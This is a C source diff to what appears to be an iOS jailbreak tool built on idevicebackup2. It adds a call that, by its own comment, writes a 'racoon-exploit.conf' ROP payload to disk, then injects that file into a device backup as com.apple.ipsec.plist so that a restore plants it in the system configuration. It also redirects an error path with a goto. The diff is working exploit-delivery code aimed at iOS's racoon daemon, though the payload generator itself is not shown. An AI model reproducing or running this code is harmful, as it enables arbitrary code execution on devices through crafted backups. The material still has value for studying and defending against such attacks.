@@ -20,6 +20,7 @@
 
 #include "idevicebackup2.h"
 #include "backup.h"
+#include "rop.h"
 
 #define CONNECTION_NAME "jailbreak"
 
@@ -426,6 +427,9 @@ int main(int argc, char** argv)
 	afc_client_t afc = NULL;
 	uint16_t port = 0;
 	char* uuid = NULL;
+	int dscs = 0;
+
+	ropMain(dscs); // this writes racoon-exploit.conf to disk
 
 	if (IDEVICE_E_SUCCESS != idevice_new(&device, NULL)) {
 		printf("No device found, is it plugged in?\n");
@@ -469,7 +473,7 @@ int main(int argc, char** argv)
 	} else {
 		free_dictionary(list);
 		fprintf(stderr, "ERROR: the directory '%s' already exists. This is most likely a failed attempt to use this code...\n", AFCTMP);
-		return -1;
+		goto fix;
 	}
 
 	afc_make_directory(afc, "/"AFCTMP);
@@ -500,7 +504,14 @@ int main(int argc, char** argv)
 
 	idevicebackup2(bargc, bargv);
 
+	backup_t* backup = backup_open(BKPTMP, uuid);
+	if (!backup) {
+		fprintf(stderr, "ERROR: failed to open backup\n");
+		return -1;
+	}
+
 	// mess up the backup :D
+	/*
 	char ipsec_plist[] =
 		"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
 		"<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
@@ -511,55 +522,61 @@ int main(int argc, char** argv)
 		"    <key>DebugLevel</key>\n"
 		"    <integer>2</integer>\n"
 		"    <key>DebugLogfile</key>\n"
-		"    <string>/var/root/racoon.log</string>\n"
+		"    <string>/private/var/log/racoon.log</string>\n"
 		"  </dict>\n"
 		"</dict>\n"
 		"</plist>\n";
+	*/
 
-	backup_t* backup = backup_open(BKPTMP, uuid);
-	if (!backup) {
-		fprintf(stderr, "ERROR: failed to open backup\n");
-		return -1;
+	backup_file_t* bf = NULL;
+	char* ipsec_plist = NULL;
+	int ipsec_plist_size = 0;
+	file_read("racoon-exploit.conf", &ipsec_plist, &ipsec_plist_size);
+	if(ipsec_plist != NULL && ipsec_plist_size > 0) {
+		/*
+		 * com.apple.ipsec.plist
+		 */
+		bf = backup_get_file(backup, "SystemPreferencesDomain", "SystemConfiguration/com.apple.ipsec.plist");
+		if (bf) {
+			fprintf(stderr, "com.apple.ipsec.plist already present, replacing\n");
+			backup_file_assign_file_data(bf, ipsec_plist, strlen(ipsec_plist), 0);
+			backup_file_set_length(bf, strlen(ipsec_plist));
+			backup_file_update_hash(bf);
+
+			if (backup_update_file(backup, bf) < 0) {
+				fprintf(stderr, "ERROR: could not add file to backup\n");
+			} else {
+				backup_write_mbdb(backup);
+			}
+		} else {
+			fprintf(stderr, "adding com.apple.ipsec.plist\n");
+			bf = backup_file_create_with_data(ipsec_plist, strlen(ipsec_plist), 0);
+			backup_file_set_domain(bf, "SystemPreferencesDomain");
+			backup_file_set_path(bf, "SystemConfiguration/com.apple.ipsec.plist");
+			backup_file_set_mode(bf, 0100644);
+			backup_file_set_inode(bf, 123456);
+			backup_file_set_uid(bf, 0);
+			backup_file_set_gid(bf, 0);
+			unsigned int tm = (unsigned int)(time(NULL));
+			backup_file_set_time1(bf, tm);
+			backup_file_set_time2(bf, tm);
+			backup_file_set_time3(bf, tm);
+			backup_file_set_length(bf, strlen(ipsec_plist));
+			backup_file_set_flag(bf, 4);
+			backup_file_update_hash(bf);
+
+			if (backup_update_file(backup, bf) < 0) {
+				fprintf(stderr, "ERROR: could not add file to backup\n");
+			} else {
+				backup_write_mbdb(backup);
+			}
+		}
+		backup_file_free(bf);
 	}
 
-	backup_file_t* bf;
-	bf = backup_get_file(backup, "SystemPreferencesDomain", "SystemConfiguration/com.apple.ipsec.plist");
-	if (bf) {
-		fprintf(stderr, "com.apple.ipsec.plist already present, replacing\n");
-		backup_file_assign_file_data(bf, ipsec_plist, strlen(ipsec_plist), 0);
-		backup_file_set_length(bf, strlen(ipsec_plist));
-		backup_file_update_hash(bf);
-
-		if (backup_update_file(backup, bf) < 0) {
-			fprintf(stderr, "ERROR: could not add file to backup\n");
-		} else {
-			backup_write_mbdb(backup);
-		}
-	} else {
-		fprintf(stderr, "adding com.apple.ipsec.plist\n");
-		bf = backup_file_create_with_data(ipsec_plist, strlen(ipsec_plist), 0);
-		backup_file_set_domain(bf, "SystemPreferencesDomain");
-		backup_file_set_path(bf, "SystemConfiguration/com.apple.ipsec.plist");
-		backup_file_set_mode(bf, 0100644);
-		backup_file_set_inode(bf, 123456);
-		backup_file_set_uid(bf, 0);
-		backup_file_set_gid(bf, 0);
-		unsigned int tm = (unsigned int)(time(NULL));
-		backup_file_set_time1(bf, tm);
-		backup_file_set_time2(bf, tm);
-		backup_file_set_time3(bf, tm);
-		backup_file_set_length(bf, strlen(ipsec_plist));
-		backup_file_set_flag(bf, 4);
-		backup_file_update_hash(bf);
-
-		if (backup_update_file(backup, bf) < 0) {
-			fprintf(stderr, "ERROR: could not add file to backup\n");
-		} else {
-			backup_write_mbdb(backup);
-		}
-	}
-	backup_file_free(bf);
-
+	/*
+	 * prefrences.plist
+	 */
 	bf = backup_get_file(backup, "SystemPreferencesDomain", "SystemConfiguration/preferences.plist");
 	if (bf) {
 		char* fn = backup_get_file_path(backup, bf);
@@ -733,6 +750,7 @@ int main(int argc, char** argv)
 	lockdownd_client_free(lckd);
 	lckd = NULL;
 
+fix:
 	printf("moving back any leftovers...\n");
 
 	list = NULL;
